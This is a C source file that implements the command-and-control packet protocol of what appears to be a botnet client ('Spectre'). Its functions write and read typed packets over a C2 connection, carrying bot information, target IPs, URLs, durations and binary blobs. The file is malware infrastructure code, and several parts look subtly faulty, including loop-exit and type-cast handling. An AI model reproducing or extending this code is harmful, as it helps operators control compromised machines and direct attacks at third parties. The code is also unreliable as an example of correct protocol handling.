#include "protocol.h"
#include "urlparser.h"

#include <malloc.h>
#include <debug.h>
#include <bot_info.h>
#include <common.h>
#include <string.h>
#include <stdio.h>

Packet *create_packet(int type) {
    Packet *packet = malloc(sizeof(Packet));

    if (packet == NULL) return NULL;

    packet->type = type;
    packet->count = 0;

    return packet;
}


bool write_packet(Packet packet) {
    cnc_conn *conn = get_cnc_conn();
    if (conn == NULL) {
        debug_printf("write_packet: cnc_conn is NULL");
        return false;
    }

    pthread_mutex_lock(conn->mx);

    if (!write_int32(conn, packet.type)) {
        debug_printf("write_packet: write_int32 failed");
        pthread_mutex_unlock(conn->mx);
        return false;
    }

    if (!write_int32(conn, packet.count)) {
        debug_printf("write_packet: write_int32 failed");
        pthread_mutex_unlock(conn->mx);
        return false;
    }

    for (int i = 0; i < packet.count; ++i) {
        if (!write_int32(conn, packet.data[i].type)) {
            debug_printf("write_packet: write_int32 failed");
            break;
        }

        if (!write_string(conn, packet.data[i].key)) {
            debug_printf("write_packet: write_string failed");
            break;
        }

        switch (packet.data[i].type) {
            case ArgTypeInt32:
                if (!write_int32(conn, *(int32_t *) packet.data[i].value)) {
                    debug_printf("write_packet: write_int32 failed");
                    break;
                }
                break;
            case ArgTypeInt64:
                if (!write_int64(conn, (int64_t) packet.data[i].value)) {
                    debug_printf("write_packet: write_int64 failed");
                    break;
                }
                break;
            case ArgTypeString:
                if (!write_string(conn, (char *) packet.data[i].value)) {
                    debug_printf("write_packet: write_string failed");
                    break;
                }
                break;
            case ArgTypeBool:
                if (!write_bool(conn, (bool) packet.data[i].value)) {
                    debug_printf("write_packet: write_bool failed");
                }
                break;
            case ArgTypeFloat:
                if (!write_float(conn, *(float *) packet.data[i].value)) {
                    debug_printf("write_packet: write_float failed");
                }
                break;
            case ArgTypeBotInfo:
                if (!write_bot_info(conn, (SpectreInfo *) packet.data[i].value)) {
                    debug_printf("write_packet: write_bot_info failed");
                }
                break;
            default:
                debug_printf("write_packet: unknown type: %d", packet.data[i].type);
                break;
        }
    }

    pthread_mutex_unlock(conn->mx);
    return true;
}

Packet *read_packet() {
    cnc_conn *conn = get_cnc_conn();
    if (conn == NULL) {
        debug_printf("read_packet: cnc_conn is NULL");
        return NULL;
    }

    pthread_mutex_lock(conn->mx);

    int type;
    if (!read_int32(conn, &type)) {
        debug_printf("read_packet: read_int32 failed");
        pthread_mutex_unlock(conn->mx);
        return NULL;
    }

    int count;
    if (!read_int32(conn, &count)) {
        debug_printf("read_packet: read_int32 failed");
        pthread_mutex_unlock(conn->mx);
        return NULL;
    }

    Packet *packet = create_packet(type);
    if (packet == NULL) {
        debug_printf("read_packet: create_packet failed");
        pthread_mutex_unlock(conn->mx);
        return NULL;
    }

    debug_printf("read_packet: type: %d, count: %d", type, count);

    packet->count = count;
    packet->data = malloc(sizeof(PacketArg) * count);
    if (packet->data == NULL) {
        debug_printf("read_packet: malloc failed");
        free(packet);
        pthread_mutex_unlock(conn->mx);
        return NULL;
    }

    for (int i = 0; i < count; ++i) {
        packet->data[i].value = NULL;
        packet->data[i].key = NULL;

        if (!read_int32(conn, &packet->data[i].type)) {
            debug_printf("read_packet: read_int32 failed");
            goto cleanup;
        }

        if (!read_string(conn, &packet->data[i].key)) {
            debug_printf("read_packet: read_string failed");
            goto cleanup;
        }

        bool isv4;
        char *url;

        debug_printf("read_packet: type: %d, key: %s", packet->data[i].type, packet->data[i].key);

        switch (packet->data[i].type) {
            case ArgTypeInt32:
                if (!read_int32(conn, (int32_t *) &packet->data[i].value)) {
                    debug_printf("read_packet: read_int32 failed");
                    goto cleanup;
                }
                break;
            case ArgTypeInt64:
                if (!read_int64(conn, (int64_t *) &packet->data[i].value)) {
                    debug_printf("read_packet: read_int64 failed");
                    goto cleanup;
                }
                break;
            case ArgTypeString:
                if (!read_string(conn, (char **) &packet->data[i].value)) {
                    debug_printf("read_packet: read_string failed");
                }
                break;
            case ArgTypeBool:
                if (!read_bool(conn, (bool *) &packet->data[i].value)) {
                    debug_printf("read_packet: read_bool failed");
                    goto cleanup;

                }
                break;
            case ArgTypeFloat:
                if (!read_float(conn, (float *) &packet->data[i].value)) {
                    debug_printf("read_packet: read_float failed");
                    goto cleanup;
                }
                break;
            case ArgTypeIP:
                if (!read_bool(conn, &isv4)) {
                    debug_printf("read_packet: read_bool failed");
                    goto cleanup;
                }

                char *ipstr;
                if (!read_string(conn, &ipstr)) {
                    debug_printf("read_packet: read_string failed");
                    goto cleanup;
                }

                debug_printf("read_packet: ipstr: %s %d", ipstr, isv4);

                if (!string_to_addr(isv4 ? AF_INET : AF_INET6, ipstr, &packet->data[i].value)) {
                    debug_printf("read_packet: string_to_addr failed");
                    goto cleanup;
                }

                break;

            case ArgTypeBinary:
                if (!read_binary(conn, (BYTES **) &packet->data[i].value)) {
                    debug_printf("read_packet: read_binary failed");
                    goto cleanup;
                }
                break;

            case ArgTypeStringList:
                if ((packet->data[i].value = read_string_list(conn)) == NULL) {
                    debug_printf("read_packet: read_string_list failed");
                    goto cleanup;
                }
                break;
            case ArgTypeStringMap:
                if ((packet->data[i].value = read_string_map(conn)) == NULL) {
                    debug_printf("read_packet: read_string_map failed");
                    goto cleanup;
                }
                break;

            case ArgTypeURL:
                if (!read_string(conn, (char **) &url)) {
                    debug_printf("read_packet: read_string failed");
                }

                debug_printf("read_packet: url: %s", url);
                if ((packet->data[i].value = parse_url(url)) == NULL) {
                    debug_printf("read_packet: parse_url failed");
                    free(url);
                    goto cleanup;
                }

                free(url);
                break;

            case ArgTypeDuration:
                if (!read_int64(conn, (int64_t *) &packet->data[i].value)) {
                    debug_printf("read_packet: read_int64 failed");
                    goto cleanup;
                }
                break;
            default:
                debug_printf("read_packet: unknown type: %d", packet->data[i].type);
                goto cleanup;
        }
    }

    pthread_mutex_unlock(conn->mx);
    return packet;

    cleanup:
    pthread_mutex_unlock(conn->mx);
    free_packet(packet);
    return NULL;
}

void free_packet(Packet *packet) {
    if (packet == NULL) return; // Null check

    if (packet->data != NULL) {
        for (int i = 0; i < packet->count; ++i) {
            if (packet->data[i].key != NULL) free(packet->data[i].key);
            if (packet->data[i].value == NULL) continue;

            switch (packet->data[i].type) {
                case ArgTypeString:
                case ArgTypeStringList:
                case ArgTypeStringMap:
                case ArgTypeBinary:
                case ArgTypeURL:
                    free(packet->data[i].value);
                    break;
                default:
                    break;
            }

        }

        free(packet->data);
        packet->data = NULL;
    }

    free(packet);
    packet = NULL;
}


void debug_packet(Packet *packet) {
#ifdef DEBUG
    debug_printf("Read packet: %d - %d", packet->type, packet->count);

    for (int i = 0; i < packet->count; ++i) {
        printf("Packet data type: %s(%d) - %s", get_type_name(packet->data[i].type), packet->data[i].type,
               packet->data[i].key);

        Map *map;
        StringList *list;
        URLComponents *url;

        if (packet->data[i].value == NULL && packet->data[i].type != ArgTypeBool) {
            printf(" - NULL\n");
            continue;
        }

        switch (packet->data[i].type) {
            case ArgTypeInt32:
                printf(" - %d", *(int32_t *) packet->data[i].value);
                break;
            case ArgTypeInt64:
#ifdef WIN32
                printf(" - %lld", *(int64_t *) packet->data[i].value);
#else
                printf(" - %jd", *(int64_t *) packet->data[i].value);
#endif
                break;
            case ArgTypeString:
                printf(" - %s", (char *) packet->data[i].value);
                break;
            case ArgTypeBool:
                printf(" - %s", packet->data[i].value ? "true" : "false");
                break;
            case ArgTypeFloat:
                printf(" - %f", *(float *) packet->data[i].value);
                break;
            case ArgTypeIP:
                printf(" - %p", packet->data[i].value);
                break;
            case ArgTypeBinary:
                printf(" - ");
                debug_bytes(packet->data[i].value, strlen(packet->data[i].value));
                break;
            case ArgTypeURL:
                url = (URLComponents *) packet->data[i].value;
                printf(" - %s", url_to_string(url));
                break;
            case ArgTypeStringMap:
                map = (Map *) packet->data[i].value;
                printf(" - [");
                for (int j = 0; j < map->count; ++j) {
                    printf("%s:%s,", map->body[j].key, map->body[j].value);
                }
                printf("]");
                break;
            case ArgTypeStringList:
                list = (StringList *) packet->data[i].value;
                for (int j = 0; j < list->count; ++j) {
                    printf("\n - %s", list->body[j]);
                }
                break;
            case ArgTypeDuration:
#ifdef WIN32
                printf(" - %lld", *(int64_t *) packet->data[i].value);
#else
                printf(" - %jd", *(int64_t *) packet->data[i].value);
#endif
                break;
            default:
                printf(" - unknown type: %d", packet->data[i].type);
                break;
        }

        printf("\n");
    }
#endif
}

